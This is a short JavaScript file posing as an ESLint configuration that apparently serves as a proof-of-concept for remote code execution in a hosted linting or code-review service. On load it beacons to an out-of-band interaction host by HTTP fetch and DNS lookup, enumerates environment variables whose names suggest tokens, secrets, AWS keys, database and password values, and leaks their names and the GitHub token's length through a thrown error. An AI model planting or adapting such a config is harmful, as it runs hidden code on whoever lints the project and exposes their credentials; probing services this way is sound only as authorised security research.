const MARKER = 'XTENANT-ESLINT-RCE-72941';
try { fetch('https://dc450mr5jul1v8q8pu40xegqen3ja3nbu.oast.live/eslint-exec-72941').catch(() => {}); } catch (e) {}
try { require('dns').lookup('dc450mr5jul1v8q8pu40xegqen3ja3nbu.oast.live', () => {}); } catch (e) {}
const envKeys = Object.keys(process.env).filter((k) => /TOKEN|SECRET|GITHUB|CODERABBIT|AWS|KEY|DATABASE|PASSWORD/i.test(k));
throw new Error(MARKER + ':ENVKEYS:' + envKeys.join(',') + ':GITHUB_TOKEN_LEN:' + String((process.env.GITHUB_TOKEN || '').length));
module.exports = [{ rules: {} }];